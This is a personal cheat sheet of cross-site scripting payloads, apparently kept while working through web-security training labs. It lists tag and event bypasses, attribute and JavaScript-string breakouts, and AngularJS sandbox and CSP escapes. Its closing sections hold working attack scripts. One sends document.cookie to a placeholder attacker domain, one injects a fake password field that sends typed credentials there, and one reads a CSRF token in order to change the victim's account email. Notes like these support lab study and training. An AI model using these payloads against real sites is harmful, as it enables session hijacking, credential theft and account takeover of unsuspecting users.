# XSS Notes

## XSS between HTML tags

  1 - Send the resulting request to Burp Intruder

  2 - In Burp Intruder

      A - Bruteforce Tag 

      B - bruteforce Events

      c - You can find Tags & events There : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

  External web site

      D - payload = <iframe src="https://example.com/?search=UR_Payload" onload=this.style.width='100px'>

      E - Put it in HTML file And upload on Attacker web site
      F - <script>
               location = 'https://example.com/?search=%<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
          </script>

IF Reflected XSS with some SVG markup allowed

      - we will put SVG tag beFor payload Then

     - Create payload by Burp Intruder

     - EX : "><svg><animatetransform onbegin=alert(1)>

### Reflected XSS with event handlers and href attributes blocked
     <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a> 

## XSS in HTML tag attributes

###  XSS context is into an HTML tag attribute value
     
    1 - erminate the attribute value, close the tag, and introduce a new one

    EX : "><script>alert(document.domain)</script> --> ore commonly in this situation, angle brackets are blocked or encoded
    
    2 -  terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context
    
    Ex : " autofocus onfocus=alert(document.domain) x=" 

    3 - Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context
  
    EX : <a href="javascript:alert(document.domain)"> 

    4 - You might encounter websites that encode angle brackets but still allow you to inject attributes
 
      - Sometimes, these injections are possible even within tags that don't usually fire events automatically, such as a **_canonical_** tag
       
       canonical : <link rel="canonical" href='https://example.net/'/> 
   
      - You can exploit this behavior using access keys and user interaction on Browser

      - Access keys allow you to provide keyboard shortcuts that reference a specific element

      - On Windows: ALT+SHIFT+X

      - On MacOS: CTRL+ALT+X

      - On Linux: Alt+X

      EX : https://example.com/?'accesskey='x'onclick='alert(1) 

           `<link rel="canonical" href='https://example.net/?'accesskey='x'onclick='alert(1)/> `

## XSS into JavaScript

      1 - Terminating the existing script

        EX : </script><script>alert(1)</script>

      2 - Breaking out of a JavaScript string

        a - EX : var searchTerms = '**'-alert(document.domain)-'**';
 
            - = ; 
         
        b - EX : var searchTerms = '\**\';alert(document.domain)//** '; 

        c - parameter : GET /post/comment/confirmation?postId=**aaaa** HTTP/1.1

          - <a href="/post?postId=**aaaa**">Back to blog</a>

          - https://acf21f131ee388c3806b199b004b00b3.web-security-academy.net/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:' 
 
       3 - Making use of HTML-encoding

         - When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.

         - <a id="author" href="http://websit" onclick="var tracker={track(){}};tracker.track('http://websit');">

         - https://foo/?&&apos;-alert(document.domain)-&apos; 

         - <a id="author" href="http://websit" onclick="var tracker={track(){}};tracker.track('https://foo/?&&apos;-alert(document.domain)-&apos;');">

      4 - XSS in JavaScript template literals

        - <script>

                            var message = `1 search results for 'test'`;

                            document.getElementById('searchMessage').innerText = message;

                        </script>

       - document.getElementById('searchMessage').innerText = ${alert(1)} ;
     
       - When the XSS context is into a JavaScript template literal, there is no need to terminate the literal

       -  you simply need to use the ${...} syntax to embed a JavaScript expression that will be executed when the literal is processed.

## XSS in the context of the AngularJS sandbox

       1 - Reflected XSS with AngularJS sandbox escape without strings

         - payload : 1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 

       2 - Bypassing a CSP with an AngularJS sandbox escape

         - [1].map(alert) TO DO hiding the window object from the AngularJS sandbox

         - payload : ``<script> location='https://example.net/?search=%3Cinput%20id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x';</script>`` 

        - The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP

        - It also uses $event, which is an AngularJS variable that references the event object

        - The path property is specific to Chrome and contains an array of elements that triggered the event

        - he last element in the array contains the window object

        - Normally, | is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the orderBy filter

        - The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z

        - The function will only be called when the orderBy operation reaches the window object in the $event.path array

        - This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS's window check
 

## Exploiting cross-site scripting to steal cookies

`<script>
	fetch('https://YOUR-SUBDOMAIN-HERE.com', {
	method: 'POST',
	mode: 'no-cors',
	body:document.cookie });
 </script>`

## Exploiting cross-site scripting to capture passwords

`<input name=username id=username>`

`<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.com',{
	method:'POST',
	mode: 'no-cors',
	body:username.value+':'+this.value });"> `
## Exploiting cross-site scripting to perform CSRF "ATO"
### If CSRF Token Not Changes
`<script>`

`var req = new XMLHttpRequest();`

`req.onload = handleResponse;`

`req.open('get','/my-account',true);`

`req.send();`

`function handleResponse() {`

`var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];`

`var changeReq = new XMLHttpRequest();`

`changeReq.open('post', '/my-account/change-email', true);`

`changeReq.send('csrf='+token+'&email=test@test.com')};`

`</script>`
